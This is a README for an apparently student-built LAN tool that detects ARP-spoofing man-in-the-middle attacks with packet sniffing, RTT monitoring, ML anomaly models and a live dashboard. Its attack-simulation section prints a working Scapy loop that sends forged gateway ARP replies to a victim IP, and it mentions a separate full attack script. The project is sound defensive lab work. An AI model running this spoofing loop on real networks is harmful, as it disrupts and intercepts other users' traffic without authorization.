# 🛡️ MITM Attack Detection System — Real-Time Network Security Monitor

A real-time **Man-in-the-Middle (MITM) attack detection system** built for LAN environments. It detects ARP spoofing attacks using packet sniffing, RTT analysis, and Machine Learning — and displays everything on a live SOC-style cybersecurity dashboard.

## ✨ Features

- **ARP Spoofing Detection** — Detects gateway MAC address changes in real-time
- **ML-Based Anomaly Detection** — Uses Isolation Forest + Local Outlier Factor (LOF) to flag suspicious traffic patterns
- **RTT Latency Monitoring** — Tracks round-trip time spikes caused by MITM interception
- **Signal Strength Tracking** — Monitors Wi-Fi RSS for network degradation
- **Live SOC Dashboard** — Dark-themed, animated security operations center UI with charts, radar, and terminal feed
- **Auto-Recovery** — System resets to SAFE when the attack stops

## 🖥️ Dashboard Preview

The dashboard features:
- Real-time **Risk Meter** (doughnut gauge)
- **RTT & Signal Strength** line charts
- **Threat Surface** radar visualization
- **Protocol Distribution** breakdown
- **Live Packet Terminal** feed
- **Alerts Feed** with export/clear functionality

## 🏗️ Architecture

```
┌─────────────┐        ┌──────────────┐        ┌─────────────────┐
│  Kali Linux │  ARP   │   Windows    │  HTTP   │    Dashboard    │
│  (Attacker) │ ────►  │  main.py     │ ────►   │   index.html    │
│  attacker.py│        │  backend.py  │  :5000  │   (Browser)     │
└─────────────┘        └──────────────┘        └─────────────────┘
```

## 🚀 Quick Start

### Prerequisites
- Python 3.10+
- Npcap (for Windows packet capture)
- A Kali Linux VM (for attack simulation)

### Install Dependencies
```bash
pip install flask flask-cors scapy scikit-learn joblib requests
```

### Run the System

**Terminal 1 — Start Backend API:**
```bash
python backend.py
```

**Terminal 2 — Start Network Detector (Run as Admin):**
```bash
python main.py
```

**Terminal 3 — Open Dashboard:**
Open `dashboard/index.html` in your browser.

### Configuration

Update these values in `main.py` to match your network:
```python
INTERFACE = "Wi-Fi"
GATEWAY_IP = "192.168.1.1"          # Your router IP
REAL_GATEWAY_MAC = "xx:xx:xx:xx:xx:xx"  # Your router MAC
```

Find your gateway MAC:
```bash
arp -a <gateway_ip>
```

## ⚔️ Simulate an Attack (Kali Linux)

1. Set Kali VM to **Bridged Adapter** mode (same network as Windows)
2. Open terminal: `sudo scapy`
3. Run:
```python
import random, time
target_ip = "192.168.1.16"    # Windows victim IP
gateway_ip = "192.168.1.1"    # Gateway IP

while True:
    mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, hwsrc=mac, pdst=target_ip), iface="eth0", verbose=0)
    print(f"Attacking... Sent ARP from {mac}")
    time.sleep(1)
```

## 🧠 ML Models

| Model | Purpose |
|---|---|
| **Isolation Forest** | Detects anomalous RTT/RSS patterns |
| **Local Outlier Factor (LOF)** | Identifies outliers in network traffic |

Models are trained on the CICIDS dataset. Training scripts are in the `ml/` directory.

## 📁 Project Structure

```
MITM_CN_Project/
├── main.py                  # Network sniffer + ML detection engine
├── backend.py               # Flask API server (port 5000)
├── dashboard/
│   ├── index.html           # SOC-style dashboard UI
│   ├── style.css            # Dark theme + animations
│   ├── app.js               # Real-time chart updates
│   └── attacker/
│       └── attacker.py      # Full MITM attack script for Kali
├── ml/
│   ├── train.py             # Model training script
│   ├── preprocess.py        # Dataset preprocessing
│   └── models/
│       ├── isolation.pkl    # Trained Isolation Forest
│       └── lof.pkl          # Trained LOF model
└── README.md
```

## 🛠️ Tech Stack

- **Backend:** Python, Flask, Scapy
- **ML:** Scikit-learn (Isolation Forest, LOF)
- **Frontend:** HTML, CSS, JavaScript, Chart.js
- **Attack Simulation:** Kali Linux, Scapy

## 👤 Built By

**Ayush Godara**

## ⚠️ Disclaimer

This project is for **educational and research purposes only**. Only use on networks you own or have explicit permission to test. Unauthorized network interception is illegal.
